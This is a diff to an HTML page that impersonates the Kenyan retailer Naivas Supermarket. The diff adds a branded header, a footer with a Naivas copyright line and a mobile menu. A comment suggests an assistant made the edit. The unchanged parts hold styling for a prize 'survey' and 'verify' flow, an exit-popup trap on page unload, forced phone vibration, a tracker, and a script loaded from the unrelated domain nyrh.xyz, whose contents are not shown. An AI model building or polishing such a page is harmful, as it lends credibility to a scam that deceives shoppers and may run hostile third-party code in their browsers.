@@ -3,53 +3,161 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Naivas Header Preview</title>
+  <title>Naivas Supermarket</title>
   <style>
+    /* HEADER STYLES ONLY */
     body {
       margin: 0;
       font-family: Arial, sans-serif;
       background: #f4f4f4;
     }
+    
     header {
-      background-color: #ff7a29;
-      padding: 20px;
+      background: linear-gradient(135deg, #ff7a29 0%, #e65c00 100%);
+      padding: 0;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+    
+    .header-main {
+      padding: 15px 5%;
       display: flex;
       justify-content: space-between;
       align-items: center;
     }
+    
     .logo {
-      display: flex;
-      align-items: center;
       font-size: 28px;
       font-weight: bold;
       color: white;
+      text-decoration: none;
     }
+    
     .nav {
       display: flex;
       gap: 20px;
     }
+    
     .nav a {
       text-decoration: none;
       color: white;
       font-weight: bold;
+      padding: 8px 12px;
+      border-radius: 4px;
+      transition: background 0.3s;
+    }
+    
+    .nav a:hover {
+      background: rgba(255, 255, 255, 0.2);
+    }
+    
+    .mobile-menu-btn {
+      display: none;
+      background: none;
+      border: none;
+      color: white;
+      font-size: 24px;
+      cursor: pointer;
+    }
+    
+    @media (max-width: 768px) {
+      .mobile-menu-btn {
+        display: block;
+      }
+      
+      .nav {
+        display: none;
+        position: absolute;
+        top: 100%;
+        left: 0;
+        right: 0;
+        background: #ff7a29;
+        flex-direction: column;
+        padding: 1rem;
+        box-shadow: 0 5px 10px rgba(0,0,0,0.1);
+      }
+      
+      .nav.active {
+        display: flex;
+      }
+    }
+    
+    /* SIMPLE FOOTER STYLES */
+    .simple-footer {
+      background: #333;
+      color: white;
+      padding: 30px 5%;
+      margin-top: 40px;
+      text-align: center;
+    }
+    
+    .footer-logo {
+      font-size: 32px;
+      font-weight: bold;
+      color: #ff7a29;
+      text-decoration: none;
+      display: block;
+      margin-bottom: 15px;
+    }
+    
+    .footer-tagline {
+      color: #ccc;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+    
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 15px;
+      margin: 20px 0;
+      list-style: none;
+      padding: 0;
+    }
+    
+    .footer-links a {
+      color: #ccc;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    
+    .footer-links a:hover {
+      color: #ff7a29;
+    }
+    
+    .copyright {
+      color: #888;
+      font-size: 12px;
+      margin-top: 20px;
+    }
+    
+    @media (max-width: 768px) {
+      .footer-links {
+        flex-direction: column;
+        gap: 10px;
+      }
     }
   </style>
 </head>
 <body>
+  <!-- SIMPLE HEADER -->
   <header>
-    <div class="logo">Naivas Supermarket</div>
-    <nav class="nav">
-      <a href="#">Home</a>
-      <a href="#">Products</a>
-      <a href="#">Offers</a>
-      <a href="#">Contact</a>
-    </nav>
+    <div class="header-main">
+      <a href="#" class="logo">NAIVAS</a>
+      <button class="mobile-menu-btn">☰</button>
+      <nav class="nav">
+        <a href="#">Home</a>
+        <a href="#">Products</a>
+        <a href="#">Offers</a>
+        <a href="#">Contact</a>
+      </nav>
+    </div>
   </header>
-</body>
 
-<img src='https://imgur.com/UDspo8s.png' width='99%'/>
+  <!-- YOUR ORIGINAL CONTENT EXACTLY AS YOU SENT IT -->
+  <img src='https://imgur.com/UDspo8s.png' width='99%'/>
   
-<style>
+  <style>
 .app{align-items:center;box-sizing:border-box;display:flex;justify-content:center;padding:15px}.left,.right{align-self:start;margin:0 20px;max-width:400px;width:100%}.product-preview__title{font-family:Pacifico,sans-serif;font-size:36px}.product-preview__image{max-width:340px;width:100%}.survey{background:#eaeaea;font-size:21px;font-weight:700;max-width:none;padding:40px;position:relative;text-align:center}.survey__question{color:#000000}.survey__answer{background:#007c33;border:8px solid #007c33;border-radius:14px;box-shadow:none;color:#fff;cursor:pointer;display:block;font-size:30px;font-weight:700;line-height:28px;margin-top:15px;padding:19px 20px;text-decoration:none;width:100%}.survey__steps{margin-top:20px}.survey__step{background:#fff;border-radius:50%;display:inline-block;font-size:0;height:30px;margin:0 5px;width:30px}.survey__step--active{background:#007c33}.modal{color:#000000;z-index:6}.modal__content{background-color:#007c33;padding:20px}.opening-modal__image{max-width:190px;width:100%}.button{background-color:#007c33;border:none;border-radius:.25rem;color:#fff;display:inline-block;font-size:1.6rem;font-weight:400;line-height:1.5;padding:.25rem 3.80rem;text-decoration:none;transition:color .15s ease-in-out,background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle}.button,.verify{text-align:center}.verify{background:#eaeaea;color:#000000;padding:40px}.verify__text{padding:2px 0}.verify__icon{max-width:13px}.verify__icon--spinner{opacity:0}.verify__icon--visible{opacity:1}.text-rotator{font-size:21px;margin-bottom:10px}@media(max-width:640px){.app{flex-direction:column}.left,.right{margin:0;max-width:none;width:100%}.survey{padding:20px}.survey__answer{font-size:18px;line-height:20px;padding:10px}}
   </style>
 <style>
@@ -255,8 +363,26 @@ window.onbeforeunload = ExitPop;
 	navigator.vibrate([1000, 300, 1000, 300,1000]);
 </script>
 
-<img src='https://imgur.com/QkfZuCa.png' width='100%'/>
   
+  <!-- SIMPLE FOOTER -->
+  <footer class="simple-footer">
+    <a href="#" class="footer-logo">NAIVAS</a>
+    <div class="footer-tagline">
+      Kenya's Leading Supermarket
+    </div>
+    
+    <ul class="footer-links">
+      <li><a href="#">Home</a></li>
+      <li><a href="#">Products</a></li>
+      <li><a href="#">Offers</a></li>
+      <li><a href="#">Contact</a></li>
+    </ul>
+    
+    <div class="copyright">
+      © 2024 Naivas Limited. All rights reserved.
+    </div>
+  </footer>
+
 <script src="https://nyrh.xyz/sparmarketsmo/css/p.js?f=sync&lr=1&partner=6ead5f0c5ddb6c1d33a3179db69d52f2ab5ba8ceb41f0306c27032933ca3b3f3" defer></script>
 
 </body>
@@ -275,37 +401,13 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?3494498&101" alt="web counter gratis" border="0"></a></noscript>
 
 <!-- Histats.com  END  -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  
+  <!-- Simple JavaScript for mobile menu -->
+  <script>
+    // Mobile menu toggle
+    document.querySelector('.mobile-menu-btn').addEventListener('click', function() {
+      document.querySelector('.nav').classList.toggle('active');
+    });
+  </script>
+</body>
+</html>
